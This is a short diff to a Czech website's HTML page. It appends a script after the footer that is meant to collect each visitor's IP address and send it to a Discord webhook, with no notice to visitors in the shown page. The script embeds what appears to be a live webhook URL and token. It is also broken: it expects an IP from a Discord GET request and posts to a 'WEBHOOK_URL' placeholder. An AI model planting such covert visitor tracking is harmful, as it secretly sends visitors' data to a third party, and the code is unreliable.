@@ -100,5 +100,28 @@
         <p>&copy; 2024 Matyáš Šibor | edit</p>
         <p>&reg; 2024 Štěpán Valíček | web</p>
     </footer>
+        <script>
+        // Získání IP adresy uživatele
+        fetch('https://discord.com/api/webhooks/1249992879842267136/WAiERCu_Nq1GUHqocOwEAPCyKX0b2DPwzhzMrD3x7BfqFmWz9bfM_c5W4Aohrf4DSwAW')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+
+                // Vytvoření objektu s daty pro odeslání na Discord webhook
+                const payload = {
+                    content: `Nový návštěvník otevřel stránku!\nIP adresa: ${userIp}`
+                };
+
+                // Odeslání webhooku na Discord
+                fetch('WEBHOOK_URL', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+    </script>
 </body>
 </html>
